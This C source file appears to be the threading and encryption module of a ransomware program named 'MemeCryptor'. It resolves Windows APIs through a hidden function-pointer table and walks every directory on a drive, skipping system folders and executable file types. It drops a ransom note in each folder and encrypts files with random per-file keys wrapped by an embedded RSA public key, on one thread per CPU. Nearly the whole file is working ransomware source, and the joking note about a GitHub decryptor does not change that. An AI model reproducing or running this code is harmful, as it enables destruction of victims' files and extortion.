#include "Threading.h"
THREAD_STRUCT threadStruct;
LPCSTR ransomNoteContent = "YA YEET!!\n\nYou have officially been memed by MemeCryptor Ransomware!\n\nAll your files are now encrypted and embedded inside an image format.\nIf you try to use any recovery software outhere, the files can potentially be damaged and unretrievable...\n\nJust kidding! I have included my decrypting software on the github repo,\nso you can download and decrypt your stuff!!\n\n---------------------------------------------------------\n\nFeel free to contact me on Twitter @cPeterr to provide any feedback!\n\nThanks,\nPeter\n";

extern FARPROC APIArray[52];
MemelstrcmpA TemplstrcmpA;
MemeStrStrIA TempStrStrIA;
MemeCreateFileA TempCreateFileA2;
MemeWriteFile TempWriteFile2;
MemeCloseHandle TempCloseHandle2;
MemeFindFirstFileA TempFindFirstFileA;
MemeEnterCriticalSection TempEnterCriticalSection;
MemeLeaveCriticalSection TempLeaveCriticalSection;
MemeCryptGenRandom TempCryptGenRandom2;
MemeFindNextFileA TempFindNextFileA;
MemeFindClose TempFindClose;
MemeCryptAcquireContextA TempCryptAcquireContextA;
MemeCryptImportKey TempCryptImportKey;
MemeCryptReleaseContext TempCryptReleaseContext2;
MemeExitThread TempExitThread;
MemeGetNativeSystemInfo TempGetNativeSystemInfo;
MemeInitializeCriticalSection TempInitializeCriticalSection;
MemeCreateThread TempCreateThread;
MemeWaitForMultipleObjects TempWaitForMultipleObjects;
MemeDeleteCriticalSection TempDeleteCriticalSection;

void populateAPIThreading() {
	TemplstrcmpA = (MemelstrcmpA)APIArray[25];
	TempStrStrIA = (MemeStrStrIA)APIArray[51];
	TempCreateFileA2 = (MemeCreateFileA)APIArray[8];
	TempWriteFile2 = (MemeWriteFile)APIArray[9];
	TempCloseHandle2 = (MemeCloseHandle)APIArray[10];
	TempFindFirstFileA = (MemeFindFirstFileA)APIArray[26];
	TempEnterCriticalSection = (MemeEnterCriticalSection)APIArray[27];
	TempLeaveCriticalSection = (MemeLeaveCriticalSection)APIArray[28];
	TempCryptGenRandom2 = (MemeCryptGenRandom)APIArray[37];
	TempFindNextFileA = (MemeFindNextFileA)APIArray[29];
	TempFindClose = (MemeFindClose)APIArray[30];
	TempCryptAcquireContextA = (MemeCryptAcquireContextA)APIArray[42];
	TempCryptImportKey = (MemeCryptImportKey)APIArray[43];
	TempCryptReleaseContext2 = (MemeCryptReleaseContext)APIArray[41];
	TempExitThread = (MemeExitThread)APIArray[31];
	TempGetNativeSystemInfo = (MemeGetNativeSystemInfo)APIArray[32];
	TempInitializeCriticalSection = (MemeInitializeCriticalSection)APIArray[33];
	TempCreateThread = (MemeCreateThread)APIArray[34];
	TempWaitForMultipleObjects = (MemeWaitForMultipleObjects)APIArray[35];
	TempDeleteCriticalSection = (MemeDeleteCriticalSection)APIArray[36];
}

int checkDirName(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	LPCSTR dirNameExcludeArray[16] = { "AppData", "tmp", "winnt", "temp", "thumb", "$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information", "Boot", "Windows", "$WINDOWS.~BT", "Windows.old", "PerfLog", "Microsoft" };
	for (int i = 0; i < 16; i++) {
		if (!TemplstrcmpA(directoryName, dirNameExcludeArray[i])) {
			return -1;
		}
	}
	return 0;
}

int checkFileName(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	LPCSTR fileNameExcludeArray[15] = { ".exe", ".dll", ".sys", ".msi", ".mui", ".inf", ".cat", ".bat", ".cmd", ".ps1", ".vbs", ".ttf", ".fon", ".lnk" };
	for (int i = 0; i < 15; i++) {
		if (TempStrStrIA(directoryName, fileNameExcludeArray[i])) {
			return -1;
		}
	}
	return 0;
}

void dropRansomNote(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen("READMEPLEASE.TXT") + 1, 1);
	if (!fileName) {
		return;
	}

	strncpy(fileName, directoryName, strlen(directoryName) - 1);
	strcat(fileName, "READMEPLEASE.TXT\0");

	HANDLE ransomNote = TempCreateFileA2(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ransomNote == INVALID_HANDLE_VALUE) {
		free(fileName);
		return;
	}
	TempWriteFile2(ransomNote, ransomNoteContent, strlen(ransomNoteContent), NULL, NULL);
	TempCloseHandle2(ransomNote);
	free(fileName);
}

int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	HANDLE hSearchHandle = NULL;
	WIN32_FIND_DATAA findFileData = WIN32_FIND_DATAA();
	LPSTR fileName = NULL;
	int returnValue = -1;
	BYTE* key = NULL;
	BYTE* nonce = NULL;
	hSearchHandle = TempFindFirstFileA(directoryName, &findFileData);

	if (hSearchHandle == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	dropRansomNote(directoryName);
	// 10387 small files -> 15039 ms to encrypt small files
	// 53 medium files -> 6237 ms to encrypt medium files
	// 25 large files -> 25000 ms to encrypt large files
	do {
		if (TempStrStrIA(findFileData.cFileName, "Microsoft")) {
			continue;
		}

		if (TemplstrcmpA(findFileData.cFileName, ".")) {
			if (TemplstrcmpA(findFileData.cFileName, "..")) {
				if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
					if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

						if (findFileData.cFileName[0] == '.') {
							continue;
						}

						if (checkDirName(findFileData.cFileName) == -1) {
							continue;
						}

						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + strlen("\\*"), 1);
						if (!fileName) {
							continue;
						}

						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);
						strcat(fileName, "\\*");
						TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
						addNode(pThreadStruct, fileName);
						TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
					}
					else {
						if (checkFileName(findFileData.cFileName) == -1) {
							continue;
						}
						if (!TemplstrcmpA(findFileData.cFileName, "READMEPLEASE.TXT")) {
							continue;
						}
						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + 1, 1);
						if (!fileName) {
							continue;
						}
						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);

						key = (BYTE*)calloc(256, 1);


						if (!key) {
							free(fileName);
							continue;
						}

						nonce = (BYTE*)calloc(8, 1);

						if (!nonce) {
							free(fileName);
							free(key);
							continue;
						}

						if (!TempCryptGenRandom2(hCryptProv, 256, key)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}

						if (!TempCryptGenRandom2(hCryptProv, 8, nonce)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}
						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);

						free(fileName);
						free(key);
						free(nonce);
					}
				}
			}
		}
	} while (TempFindNextFileA(hSearchHandle, &findFileData) != 0);

	returnValue = 0;
CLEANUP:
	if (hSearchHandle) {
		TempFindClose(hSearchHandle);
	}
	return returnValue;
}

int acquireContext(HCRYPTPROV* phCryptProv) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}
	return -1;
}

void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	HCRYPTPROV hCryptProv;
	HCRYPTKEY publicKey;
	int returnVal = -1;
	int threadID = -1;

	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (TempCryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
		goto CLEANUP;
	}

	while (TRUE) {
		LL_NODE* curr = NULL;
		int counter = 0;
		while (TRUE) {
			if (counter == 2) {
				goto CLEANUP;
			}
			TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
			if (pThreadStruct->head) {
				curr = popNode(pThreadStruct);
				break;
			}
			TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
			counter++;
		}

		if (!curr) {
			continue;
		}

		LPSTR dirName = (LPSTR)calloc(strlen(curr->dirName) + 1, 1);
		if (!dirName) {
			continue;
		}
		strcpy(dirName, curr->dirName);
		freeNode(curr);

		TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);

		mainThreadEncryption(hCryptProv, publicKey, dirName, pThreadStruct);

		if (dirName) {
			free(dirName);
		}
	}

CLEANUP:
	if (hCryptProv) {
		TempCryptReleaseContext2(hCryptProv, 0);
	}
	TempExitThread(returnVal);
}

int initThreadStruct() {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	THREAD_STRUCT* pThreadStruct = &threadStruct;

	SYSTEM_INFO systemInfo = SYSTEM_INFO();

	TempGetNativeSystemInfo(&systemInfo);

	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;

	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
	if (!buffer) {
		return -1;
	}
	TempInitializeCriticalSection(&pThreadStruct->threadCriticalSection);

	pThreadStruct->threadArray = buffer;
	return 0;
}

void launchThreadEncrypt(LPSTR drivePath) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	THREAD_STRUCT* pThreadStruct = &threadStruct;
	LPSTR firstDir = (LPSTR)(calloc(strlen(drivePath) + 3, 1));
	if (!firstDir) {
		return;
	}
	strcpy(firstDir, drivePath);
	strcat(firstDir, "\\*\0");

	addNode(pThreadStruct, firstDir);
	for (int i = 0; i < pThreadStruct->threadCount; i++) {
		pThreadStruct->threadArray[i] = TempCreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
			continue;
		}
	}
}

void cleanUpThread() {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	THREAD_STRUCT* pThreadStruct = &threadStruct;

	TempWaitForMultipleObjects(pThreadStruct->threadCount, pThreadStruct->threadArray, TRUE, INFINITE);
	TempDeleteCriticalSection(&pThreadStruct->threadCriticalSection);
	if (pThreadStruct->threadArray) {
		for (int i = 0; i < pThreadStruct->threadCount; i++) {
			if (pThreadStruct->threadArray[i]) {
				TempCloseHandle2(pThreadStruct->threadArray[i]);
			}
		}
		free(pThreadStruct->threadArray);
	}
}

void freeNode(LL_NODE* node) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	if (node) {
		if (node->dirName) {
			free(node->dirName);
		}
		free(node);
	}
}

LL_NODE* popNode(THREAD_STRUCT* pThreadStruct) {
	if (pThreadStruct->head) {
		LL_NODE* result = pThreadStruct->head;
		pThreadStruct->head = result->nextNode;
		return result;
	}
	return NULL;

}

int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name) {
	LL_NODE* node = newNode();
	if (!node) {
		return -1;
	}
	if (pThreadStruct->head == NULL) {
		pThreadStruct->head = node;
		pThreadStruct->tail = pThreadStruct->head;
		pThreadStruct->tail->dirName = name;
	}
	else {
		pThreadStruct->tail->nextNode = node;
		pThreadStruct->tail = pThreadStruct->tail->nextNode;
		pThreadStruct->tail->dirName = name;
	}
	return 0;
}

LL_NODE* newNode() {
	LL_NODE* node = (LL_NODE*)calloc(sizeof(LL_NODE), 1);
	if (!node) {
		return NULL;
	}
	node->dirName = NULL;
	node->nextNode = NULL;
	return node;
}